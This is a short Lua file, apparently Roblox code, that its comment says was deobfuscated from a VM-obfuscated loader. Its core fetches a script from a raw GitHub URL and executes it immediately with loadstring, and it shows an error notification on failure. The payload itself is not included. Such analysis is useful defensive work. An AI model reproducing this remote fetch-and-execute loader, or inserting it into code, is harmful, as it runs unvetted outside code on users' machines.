-- Deobfuscated from Dirty/Main.lua.
-- The original file is a VM-obfuscated loader that fetches and executes this
-- remote payload. As of 2026-06-14, the GitHub repository/path returns 404.

local Players = game:GetService("Players")
local UserInputService = game:GetService("UserInputService")

local player = Players.LocalPlayer
local playerGui = player and player:FindFirstChildOfClass("PlayerGui")

local payloadUrl = "https://raw.githubusercontent.com/amorestar/shitcode/refs/heads/main/unionball.lua"

local success, err = pcall(function()
    local source = game:HttpGet(payloadUrl)
    loadstring(source)()
end)

if not success then
    game.StarterGui:SetCore("SendNotification", {
        Title = "Loading Error",
        Text = tostring(err),
        Duration = 8,
    })
end
